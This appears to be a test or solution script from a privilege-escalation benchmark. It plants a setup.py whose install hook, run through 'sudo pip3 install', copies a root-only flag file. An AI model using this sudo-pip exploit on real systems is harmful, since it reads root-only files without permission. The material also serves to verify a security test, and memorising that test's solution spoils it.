#!/usr/bin/env bash
set -euo pipefail
source "$(cd "$(dirname "$0")" && pwd)/_common.sh"
out="$(ssh_run '
rm -f /tmp/pipflag
cd /home/lowpriv/pipproj
cat > setup.py <<'\''EOF'\''
from setuptools import setup
from setuptools.command.install import install
import subprocess

class RootInstall(install):
    def run(self):
        subprocess.check_call(["sh", "-c", "cat /root/flag.txt > /tmp/pipflag"])
        install.run(self)

setup(
    name="bench-pwn",
    version="1.0.0",
    cmdclass={"install": RootInstall},
)
EOF
cat > pyproject.toml <<'\''EOF'\''
[project]
name = "bench-pwn"
version = "1.0.0"
EOF
sudo /usr/bin/pip3 install . --break-system-packages >/dev/null 2>&1
test -r /tmp/pipflag && cat /tmp/pipflag
')"
assert_root_output "${out}"
